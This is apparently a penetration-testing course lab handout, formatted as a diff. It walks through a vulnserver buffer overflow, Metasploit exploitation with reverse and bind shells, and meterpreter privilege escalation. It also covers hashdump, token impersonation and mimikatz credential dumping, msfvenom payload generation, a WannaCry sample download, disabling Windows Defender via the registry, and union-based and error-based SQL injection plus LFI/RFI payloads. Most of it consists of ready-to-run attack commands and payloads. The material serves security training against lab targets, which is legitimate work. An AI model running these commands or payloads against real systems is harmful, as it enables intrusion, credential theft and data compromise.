+----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/http/http_version                
+ 
+set RHOSTS 45.77.162.239
+ 
+set RPORT 80
+ 
+run
+----------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+use auxiliary/scanner/http/tomcat_enum                  
+ 
+set RHOSTS 217.108.137.200
+ 
+set RPORT 8080
+ 
+run
+-----------------------------------------------------------------------
+
+
+#####################################
+# Quick Stack Based Buffer Overflow #
+#####################################
+ 
+- You can download everything you need for this exercise from the links below (copy nc.exe into the c:\windows\system32 directory)
+http://45.63.104.73/ExploitLab.zip
+http://45.63.104.73/nc-password-is-netcat.zip   <--- save this file to your c:\windows\system32 directory
+ 
+ 
+ 
+- Extract the ExploitLab.zip file to your Desktop
+ 
+- Go to folder C:\Users\student\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
+ 
+- Open a new command prompt and type:
+ 
+---------------------------Type This-----------------------------------
+nc localhost 9999
+--------------------------------------------------------------------------
+ 
+- In the new command prompt window where you ran nc type:
+HELP
+ 
+- Go to folder C:\Users\student\Desktop\ExploitLab\4-AttackScripts
+- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
+ 
+- Now double-click on 1-simplefuzzer.py
+- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
+ 
+ 
+- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
+ 
+- Now go to folder C:\Users\student\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
+ 
+- Go back to folder C:\Users\student\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
+ 
+- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
+ 
+- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
+ 
+- Calculate the distance to EIP by running script 3-3000chars.py
+- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
+ 
+4-count-chars-to-EIP.py
+- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
+- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
+ 
+5-2006char-eip-check.py
+- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
+ 
+6-jmp-esp.py
+- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
+ 
+7-first-exploit
+- In this script we actually do the stack overflow and launch a bind shell on port 4444
+ 
+8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
+ 
+ 
+------------------------------
+ 
+ 
+ 
+Skill Level 3. Identify unknown vulnerabilities
+-----------------------------------------------
+ 
+- App Type
+------------
+   Stand Alone             Client Server               Web App
+ 
+                       ***(vulnerserver.exe)***
+ 
+ 
+- Input TYpe
+-------------
+   FIle                    logical network port            Browser
+   Keyboard
+   Mouse
+ 
+ 
+ 
+                       ***(9999)***
+ 
+ 
+- Map & Fuzz app entry points:
+------------------------------
+   - Commands              ***(commands)***
+   - Methods
+   - Verbs
+   - functions
+   - subroutines
+   - controllers
+ 
+ 
+- Isolate the crash
+-------------------
+App seems to reliably crash at TRUN 2100
+ 
+ 
+- Calculate the distance to EIP
+-------------------------------
+Distance to EIP is 2006
+ 
+We found that EIP was populated with the value: 396F4338
+396F4338 is 8 (38), C (43), o (6F), 9 (39) so we search for 8Co9 in the non_repeating pattern
+ 
+An online tool that we can use for this is:
+https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
+ 
+ 
+ 
+- Redirect Program Execution
+----------------------------
+A 3rd party dll named essfunc.dll seems to be the best candidate for the 'JMP ESP' instruction.
+We learned that we control EAX and ESP in script 2.
+ 
+ 
+ 
+ 
+ 
+- Implement Shellcode
+---------------------
+There are only 2 things that can go wrong with shellcode:
+- Not enough space
+- Bad characters
+ 
+ 
+ 
+ 
+ 
+ 
+#########################################
+# FreeFloat FTP Server Exploit Analysis #
+#########################################
+ 
+ 
+ 
+Analyze the following exploit code:
+https://www.exploit-db.com/exploits/15689/
+ 
+1. What is the target platform that this exploit works against?
+2. What is the variable name for the distance to EIP?
+3. What is the actual distance to EIP in bytes?
+4. Describe what is happening in the variable ‘junk2’
+ 
+ 
+ 
+ 
+Analysis of the training walk-through based on EID: 15689:
+http://45.63.104.73/ff.zip
+ 
+ 
+ 
+ 
+ff1.py
+1. What does the sys module do?
+2. What is sys.argv[1] and sys.argv[2]?
+3. What application entry point is being attacked in this script?
+ 
+ 
+ 
+ff2.py
+1. Explain what is happening in lines 18 - 20 doing.
+2. What is pattern_create.rb doing and where can I find it?
+3. Why can’t I just double click the file to run this script?
+ 
+ 
+ 
+ff3.py
+1. Explain what is happening in lines 17 - to 25?
+2. Explain what is happening in lines 30 - to 32?
+3. Why is everything below line 35 commented out?
+ 
+ 
+ 
+ff4.py
+1. Explain what is happening in lines 13 to 15.
+2. Explain what is happening in line 19.
+3. What is the total length of buff?
+ 
+ 
+ 
+ff5.py
+1. Explain what is happening in line 15.
+2. What is struct.pack?
+3. How big is the shellcode in this script?
+ 
+ 
+ 
+ff6.py
+1. What is the distance to EIP?
+2. How big is the shellcode in this script?
+3. What is the total byte length of the data being sent to this app?
+ 
+ 
+ 
+ 
+ff7.py
+1. What is a tuple in python?
+2. How big is the shellcode in this script?
+3. Did your app crash in from this script?
+ 
+ 
+ 
+ 
+ff8.py
+1. How big is the shellcode in this script?
+2. What is try/except in python?
+3. What is socket.SOCK_STREAM in Python?
+ 
+ 
+ 
+ff9.py
+1. What is going on in lines 19 and 20?
+2. What is the length of the NOPs?
+3. From what DLL did the address of the JMP ESP come from?
+ 
+ 
+ 
+ 
+ff010.py
+1. What is going on in lines 18 - 20?
+2. What is going on in lines 29 - 32?
+3. How would a stack adjustment help this script? 
+
+
+#####################################################
+# Log into the Linux virtual machine on your laptop #
+# username: infosecaddicts                          #
+# password: infosecaddicts                          #
+#####################################################
+
+
+/bin/bash
+
+sudo apt-get install -y build-essential libreadline-dev libssl-dev libpq5 libpq-dev libreadline5 libsqlite3-dev libpcap-dev git-core autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev libyaml-dev curl zlib1g-dev gawk bison libffi-dev libgdbm-dev libncurses5-dev libtool sqlite3 libgmp-dev gnupg2 dirmngr nmap
+
+gpg2 --keyserver hkp://pool.sks-keyservers.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB
+
+curl -L https://get.rvm.io | bash -s stable
+
+source ~/.rvm/scripts/rvm
+
+echo "source ~/.rvm/scripts/rvm" >> ~/.bashrc
+
+source ~/.bashrc
+
+RUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version -q -O - )
+
+rvm install $RUBYVERSION
+
+rvm use $RUBYVERSION --default
+
+cd ~/toolz
+
+sudo git clone https://github.com/rapid7/metasploit-framework.git
+
+sudo chown -R `whoami` ~/toolz/metasploit-framework
+
+mv metasploit-framework metasploit
+
+cd ~/toolz/metasploit
+
+rvm --default use ruby-${RUBYVERSION}@metasploit
+
+rvm --default use ruby-${RUBYVERSION}@metasploit
+
+rvm use $RUBYVERSION --default
+
+ruby -v
+
+gem install bundler
+
+bundle install
+
+gem install bundler
+
+bundle install
+
+
+################################
+# Exploitation with Metasploit #
+################################
+Step 1: Disable the firewall on your Windows 10 host
+ 
+Step 2: Run your command prompt as an administrator
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+ 
+Step 3: Restart your computer (I'm sorry - I know this sux!)
+ 
+Step 4: Start the vulnerable server (no need to turn on OllyDBG)
+ 
+Step 5: From your CentoS run the following commands
+---------------------------Type This-----------------------------------
+cd ~/
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/ExploitLab.zip
+ 
+unzip ExploitLab.zip
+ 
+cd ExploitLab/4-AttackScripts/
+ 
+vi vulnserv.rb
+ 
+cp vulnserv.rb ~/toolz/metasploit/modules/exploits/windows/misc
+ 
+cd ~/toolz/metasploit/
+ 
+./msfconsole
+ 
+ 
+ 
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST [CHANGEME-TO-YOUR-WIN10-IP]
+set RPORT 9999
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+###########################
+# Client-Side Enumeration #
+###########################
+ 
+ 
+ 
+********************************** Figure out who and where you are **********************************
+ 
+ 
+---------------------------Type This-----------------------------------
+meterpreter> sysinfo
+ 
+ 
+meterpreter> getuid
+ 
+ 
+meterpreter> ipconfig
+ 
+ 
+meterpreter> run post/windows/gather/checkvm
+ 
+meterpreter> run post/multi/manage/autoroute
+-----------------------------------------------------------------------
+ 
+ 
+********************************** Enumerate the host you are on **********************************
+ 
+ 
+---------------------------Type This-----------------------------------
+meterpreter > run post/windows/gather/enum_applications
+ 
+meterpreter > run post/windows/gather/enum_logged_on_users
+ 
+meterpreter > run post/windows/gather/usb_history
+ 
+meterpreter > run post/windows/gather/enum_shares
+ 
+meterpreter > run post/windows/gather/enum_snmp
+ 
+meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+********************************** Escalate privileges and get hashes **********************************
+ 
+ 
+---------------------------Type This-----------------------------------
+meterpreter> use priv
+-----------------------------------------------------------------------
+ 
+ 
+--Option 1: GetSystem
+---------------------------Type This-----------------------------------
+meterpreter> getsystem
+-----------------------------------------------------------------------
+ 
+--Option 2:
+---------------------------Type This-----------------------------------
+meterpreter > run post/windows/escalate/getsystem
+-----------------------------------------------------------------------
+ 
+--Option 3:
+---------------------------Type This-----------------------------------
+meterpreter> background
+back
+use post/windows/escalate/droplnk
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 1234
+exploit
+-----------------------------------------------------------------------
+ 
+--Option 4:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/bypassuac
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 12345
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+--Option 5:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/service_permissions
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 5555
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+--Option 6:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/trusted_service_path
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 4567
+exploit
+-----------------------------------------------------------------------
+ 
+--Option 7:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ppr_flatten_rec
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 7777
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+--Option 8:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ms_ndproxy
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 7788
+exploit
+-----------------------------------------------------------------------
+ 
+--Option 9:
+---------------------------Type This-----------------------------------
+use exploit/windows/local/ask
+set SESSION 1
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST [ ChangeME to CentOS VM IP ]                                            
+set LPORT 7799
+exploit
+-----------------------------------------------------------------------
+ 
+ 
+    A window will pop up and you need to click Yes in order to get your new meterpreter shell
+ 
+ 
+meterpreter > getuid
+ 
+meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
+ 
+meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
+ 
+meterpreter > getsystem
+...got system (via technique 1).
+ 
+ 
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+ 
+ 
+meterpreter> run post/windows/gather/hashdump
+ 
+meterpreter> run post/windows/gather/credentials/credential_collector
+-----------------------------------------------------------------------
+ 
+ 
+********************************** Steal Tokens **********************************
+ 
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > use incognito
+ 
+meterpreter > list_tokens -u
+ 
+meterpreter > list_tokens -g
+ 
+meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
+ 
+meterpreter> getuid
+-----------------------------------------------------------------------
+ 
+ 
+************ Stealing credentials and certificates ************
+- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
+ 
+---------------------------Type This-----------------------------------
+meterpreter > getsystem
+ 
+meterpreter > load mimikatz
+ 
+meterpreter > kerberos
+ 
+meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
+ 
+meterpreter > msv                                                               <-- Your AD password
+ 
+meterpreter > livessp                                                           <-- Your Windows8 password
+ 
+meterpreter > ssp                                                               <-- Your outlook password
+ 
+meterpreter > tspkg                                                             <-- Your AD password
+ 
+meterpreter > wdigest                                                           <-- Your AD password
+ 
+meterpreter > mimikatz_command -f crypto::listStores
+ 
+meterpreter > mimikatz_command -f crypto::listCertificates
+ 
+meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
+ 
+meterpreter > mimikatz_command -f crypto::patchcapi
+ 
+meterpreter> search -d <directory> -f <file-pattern>
+-----------------------------------------------------------------------
+###########################################
+# Section 4: Custom Meterpreter Scripting #
+###########################################
+---------------------------Type This-----------------------------------
+cd ~
+mkdir binaries
+cd ~/binaries
+wget https://s3.amazonaws.com/infosecaddictsfiles/wce.exe
+wget https://s3.amazonaws.com/infosecaddictsfiles/nc.exe
+wget https://s3.amazonaws.com/infosecaddictsfiles/mimikatz.exe
+-----------------------------------------------------------------------
+- In this lab we will be looking at how you can use some custom Meterpreter scripts to do more than what Metasploit
+ 
+can offer.  This will also show you the flexibility of the Meterpreter scripts.
+ 
+- We're going to start off with a simple Hello World script first.  
+ 
+---------------------------Type This-----------------------------------  
+echo 'print_status("Hello World")' > /home/infosecaddicts/toolz/metasploit/scripts/meterpreter/helloworld.rb
+-----------------------------------------------------------------------
+ 
+- This next portion is up to you, exploit your test box and end up with a Meterpreter shell.
+ 
+- Lets test out our helloworld.rb Meterpreter script.
+ 
+---------------------------Type This-----------------------------------
+meterpreter> run helloworld
+ 
+ 
+- So far so good, now we can build on this base.  Lets add a couple more API calls to the script.
+ 
+- Open /home/infosecaddicts/toolz/metasploit/scripts/meterpreter/helloworld.rb in your favorite and add following
+ 
+line.
+---------------------------Type This-----------------------------------
+vi /home/infosecaddicts/toolz/metasploit/scripts/meterpreter/helloworld.rb
+ 
+ 
+---------------------------Type This-----------------------------------
+print_error("this is an error!")
+print_line("this is a line")
+ 
+- Now run the script:
+ 
+meterpreter> run helloworld
+ 
+ 
+- Now that we have the basics down, we're going to do something a little more exciting.  
+- The architecture to follow when creating these scripts goes as follows:
+ 
+def getinfo(session)
+        begin
+            <stuff goes here>
+        rescue ::Exception => e
+            <stuff goes here>
+        end
+end
+ 
+-----------------------------------------------------------------------
+- Copy and paste the following code into our helloworld.rb script:
+---------------------------Type This-----------------------------------
+def getinfo(session)
+    begin
+       sysnfo = session.sys.config.sysinfo
+       runpriv = session.sys.config.getuid
+       print_status("Getting system information ...")
+       print_status("The target machine OS is #{sysnfo['OS']}")
+       print_status("The computer name is #{'Computer'} ")
+       print_status("Script running as #{runpriv}")
+    rescue ::Exception => e
+      print_error("The following error was encountered #{e}")
+   end
+end
+ 
+getinfo(client)
+--------------------------------------------------------------------------
+ 
+ 
+- Now run the script:
+---------------------------Type This-----------------------------------
+meterpreter> run helloworld
+ 
+ 
+- We can expand it by adding actual system commands to the script, lets look at how we can do this.
+ 
+---------------------------Type This-----------------------------------
+def list_exec(session,cmdlst)
+    print_status("Running Command List ...")
+    r=''
+    session.response_timeout=120
+    cmdlst.each do |cmd|
+       begin
+          print_status "running command #{cmd}"
+          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
+          while(d = r.channel.read)
+ 
+             print_status("#{d}")
+          end
+          r.channel.close
+          r.close
+       rescue ::Exception => e
+          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
+       end
+    end
+ end
+ 
+commands = [ "set",
+    "ipconfig  /all",
+    "arp -a"]
+ 
+list_exec(client,commands)
+------------------------------------------------------------------------
+ 
+ 
+- Run the script:
+---------------------------Type This-----------------------------------
+meterpreter> run helloworld
+ 
+ 
+Note: Add all of the commands from the script below to your helloworld.rb script:
+https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/meterpreter/winenum.rb
+ 
+ 
+ 
+---------------------------------------------------------------------------------
+ 
+ 
+wget http://45.63.104.73/wannacry.zip
+ 
+unzip wannacry.zip
+     **** password is infected ***
+ 
+file wannacry.exe
+ 
+objdump -x wannacry.exe
+ 
+strings wannacry.exe
+ 
+strings --all wannacry.exe | head -n 6
+ 
+strings wannacry.exe | grep -i dll
+ 
+strings wannacry.exe | grep -i library
+ 
+strings wannacry.exe | grep -i reg
+ 
+strings wannacry.exe | grep -i key
+ 
+strings wannacry.exe | grep -i rsa
+ 
+strings wannacry.exe | grep -i open
+ 
+strings wannacry.exe | grep -i get
+ 
+strings wannacry.exe | grep -i mutex
+ 
+strings wannacry.exe | grep -i irc
+ 
+strings wannacry.exe | grep -i join        
+ 
+strings wannacry.exe | grep -i admin
+ 
+strings wannacry.exe | grep -i list
+
+
+cd ~/toolz/metasploit/
+./msfvenom -p windows/meterpreter/reverse_tcp lhost={<your-linux-vm-ip>} lport=443 -f exe -o ~/yourname_reverseshell_payload.exe
+./msfvenom -p windows/meterpreter/bind_tcp lport=4444 -f exe -o ~/yourname_bindshell_payload.exe
+./msfvenom -p windows/exec CMD=calc.exe -f exe -o ~/yourname_calc_payload.exe
+./msfvenom -p windows/vncinject/reverse_tcp lhost={<your-linux-vm-ip>} lport=443 -f exe -o ~/yourname_vncinject_reverseshell_payload.exe
+
+cd ~
+
+***** now run all of the previous commands against your newly created payloads *****
+
+**** now upload your newly created payloads to virustotal ****
+
+**** now upload your newly created payloads to reverse.it ****
+
+
+
+##################################
+# Basic: Web Application Testing #
+##################################
+ 
+Most people are going to tell you reference the OWASP Testing guide.
+https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
+ 
+I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.
+ 
+ 
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+ 
+  1. Does the website talk to a DB?
+      - Look for parameter passing (ex: site.com/page.php?id=4)
+      - If yes - try SQL Injection
+ 
+  2. Can I or someone else see what I type?
+      - If yes - try XSS
+ 
+  3. Does the page reference a file?
+      - If yes - try LFI/RFI
+ 
+Let's start with some manual testing against 45.63.104.73
+ 
+ 
+#######################
+# Attacking PHP/MySQL #
+#######################
+ 
+Go to LAMP Target homepage
+https://phpapp.infosecaddicts.com/
+ 
+ 
+ 
+Clicking on the Acer Link:
+https://phpapp.infosecaddicts.com/acre2.php?lap=acer
+ 
+   - Found parameter passing (answer yes to question 1)
+   - Insert ' to test for SQLI
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=acer'
+ 
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''acer''' at line 1
+ 
+ 
+ 
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=acer' order by 100-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '100' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=acer' order by 50-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=acer' order by 25-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '25' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=acer' order by 12-- +
+-----------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '12' in 'order clause'
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=acer' order by 6-- +
+-----------------------------------------------------------------------
+ 
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+ 
+ 
+ 
+Now we build out the union all select statement with the correct number of columns
+ 
+Reference:
+http://www.techonthenet.com/sql/union.php
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Now we negate the parameter value 'acer' by turning into the word 'null':
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+-----------------------------------------------------------------------
+ 
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+ 
+ 
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
+ 
+ 
+https://phpapp.infosecaddicts.com/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+########################
+# Question I get a lot #
+########################
+Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.
+ 
+Here is a good reference for it:
+https://www.symantec.com/connect/blogs/mysql-injection-comments-comments
+ 
+Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.
+ 
+ 
+ 
+ 
+#########################
+# File Handling Attacks #
+#########################
+ 
+Here we see parameter passing, but this one is actually a yes to question number 3 (reference a file)
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/showfile.php?filename=about.txt
+ 
+-----------------------------------------------------------------------
+ 
+ 
+See if you can read files on the file system:
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/showfile.php?filename=/etc/passwd
+-----------------------------------------------------------------------
+ 
+We call this attack a Local File Include or LFI.
+ 
+Now let's find some text out on the internet somewhere:
+https://www.gnu.org/software/hello/manual/hello.txt
+ 
+ 
+Now let's append that URL to our LFI and instead of it being Local - it is now a Remote File Include or RFI:
+ 
+---------------------------Type This-----------------------------------
+ 
+https://phpapp.infosecaddicts.com/showfile.php?filename=https://www.gnu.org/software/hello/manual/hello.txt
+-----------------------------------------------------------------------
+ 
+#########################################################################################
+# SQL Injection                                                                         #
+# https://phpapp.infosecaddicts.com/1-Intro_To_SQL_Intection.pptx                       #
+#########################################################################################
+ 
+ 
+- Another quick way to test for SQLI is to remove the paramter value
+ 
+ 
+#############################
+# Error-Based SQL Injection #
+#############################
+---------------------------Type This-----------------------------------
+ 
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))--     NOTE: "N" - just means to keep going until you run out of databases
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+#############################
+# Union-Based SQL Injection #
+#############################
+ 
+---------------------------Type This-----------------------------------
+ 
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 order by 100--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 order by 50--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 order by 25--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 order by 10--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 order by 5--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 order by 6--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 order by 7--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 order by 8--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 order by 9--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+-----------------------------------------------------------------------
+ 
+ We are using a union select statement because we are joining the developer's query with one of our own.
+   Reference:
+   http://www.techonthenet.com/sql/union.php
+   The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements.
+   It removes duplicate rows between the various SELECT statements.
+ 
+   Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
+ 
+---------------------------Type This-----------------------------------
+ 
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+-----------------------------------------------------------------------
+ 
+   Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
+ 
+---------------------------Type This-----------------------------------
+ 
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Another way is to see if you can get the backend to perform an arithmetic function
+ 
+---------------------------Type This-----------------------------------
+ 
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=(2)
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=(4-2)  
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=(4-1)
+ 
+ 
+ 
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1=1--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1=2--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=1*1
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1 >-1#
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1<99#
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 1<>1#
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 or 2 != 3--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 &0#
+ 
+ 
+ 
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 and 1=1--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 and 1=2--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 and user='joe' and 1=1--
+https://aspdotnetapp.infosecaddicts.com/bookdetail.aspx?id=2 and user='dbo' and 1=1--
+ 
+-----------------------------------------------------------------------
+ 
+ 
+###############################
+# Blind SQL Injection Testing #
+###############################
